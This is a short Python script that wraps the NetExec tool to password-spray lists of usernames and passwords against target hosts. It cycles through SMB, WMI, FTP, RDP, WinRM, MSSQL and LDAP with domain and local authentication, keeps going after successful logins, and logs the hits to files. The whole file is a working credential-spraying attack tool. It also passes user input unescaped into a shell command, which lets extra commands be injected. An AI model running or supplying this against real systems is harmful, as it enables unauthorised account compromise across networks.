#!/bin/env python3
import argparse 
from subprocess import run, PIPE, Popen, DEVNULL

class CredSpray:

    def __init__(self):
        self.usernames = None
        self.passwords = None
        self.passwords = None
        self.targets = None
        self._parse_args()
        self.protocols = ['smb','wmi','ftp','rdp','winrm','mssql','ldap']
        self.standard_flags = {'AD':'','local':'--local-auth'}
        self.smb_flags = {'shares':'--shares','pass_pol':'--pass-pol','users':'--users','groups':'--groups','sessions':'--sessions','loggedon':'--loggedon-users'}
        
    def _parse_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u','--usernames',help='usernames or list')
        parser.add_argument('-p','--passwords',help='passwords or list')
        parser.add_argument('-H','--hash',help='hash')
        parser.add_argument('-t','--targets',help='target ips or list')
        args = parser.parse_args()
        if not args:
            print('ERROR: not args')
            exit(1)
        self.usernames = args.usernames
        self.passwords = args.passwords
        self.targets = args.targets

    def nxc_spray(self):
        targets = self.targets
        for proto in self.protocols:
            for flag_name,flag in self.standard_flags.items():
                command = f'nxc {proto} {targets} -u {self.usernames} -p {self.passwords} {flag} --continue-on-success | tee -a {proto}.{flag_name}.txt'
                print(command)
                run([command],shell=True,universal_newlines=True)

def main():
    try:
        CS = CredSpray()
        CS.nxc_spray()
    except Exception as e:
        print('ERROR:',e)
        exit(1)
if __name__ == '__main__':
    main()
